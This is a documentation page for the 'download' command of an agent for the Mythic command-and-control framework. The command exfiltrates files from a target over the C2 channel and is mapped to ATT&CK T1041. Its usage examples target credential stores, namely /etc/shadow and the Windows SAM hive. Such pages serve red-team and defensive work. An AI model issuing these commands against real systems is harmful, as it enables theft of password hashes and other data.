+++
title = "download"
chapter = false
weight = 100
hidden = false
+++

## Summary

Exfiltrate a file from the target using Mythic's chunked file transfer protocol.
- Needs Admin: False
- Supported OS: Linux, macOS, Windows
- Version: 1
- Author: @grampae

### Arguments

#### path

- Description: Absolute path of the file to download from the target
- Type: String
- Required: Required

## Usage

```
download {"path":"/etc/shadow"}
```
```
download {"path":"C:\\Windows\\System32\\SAM"}
```

## MITRE ATT&CK Mapping

- T1041

## Detailed Summary

Reads the file in 512 KB chunks and sends each chunk to Mythic using the standard download protocol. The file appears in the Mythic file browser on completion. Large files are fully supported.
